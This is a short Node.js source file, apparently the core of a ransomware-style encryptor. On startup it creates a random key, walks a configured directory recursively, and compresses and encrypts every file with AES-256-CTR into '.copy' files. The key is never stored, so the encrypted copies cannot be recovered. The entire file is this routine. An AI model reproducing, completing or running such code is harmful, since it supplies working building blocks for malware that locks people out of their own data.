const settings  = require("./settings")
const rand      = require("random-key")
const cryptoLib = require('crypto')
const zlib      = require('zlib')
const fs        = require('fs')

class crypto {
    
    constructor(){
        this.generateKey()
        this.scanDirectory(settings.defaultDirectory)
    }
    
    generateKey(){
        this.key = rand.generate(50);
    }
    
    scanDirectory(path){
        const that = this
        fs.readdir(path, function(err, items) {
            for (var i=0; i<items.length; i++) {
                let fullPath = path+items[i]
                if(fs.statSync(fullPath).isDirectory()){
                    fullPath += '/'
                    that.scanDirectory(fullPath)
                }else{
                    console.log(fullPath)
                    that.encryptFile(fullPath)
                }
            }
        });
    }
    
    encryptFile(path){
        let r = fs.createReadStream(path)
        let zip = zlib.createGzip()
        let encrypted = cryptoLib.createCipher('aes-256-ctr', this.key)
        let w = fs.createWriteStream(path+'.copy')
        r.pipe(zip).pipe(encrypted).pipe(w)
    }
    
}

module.exports = crypto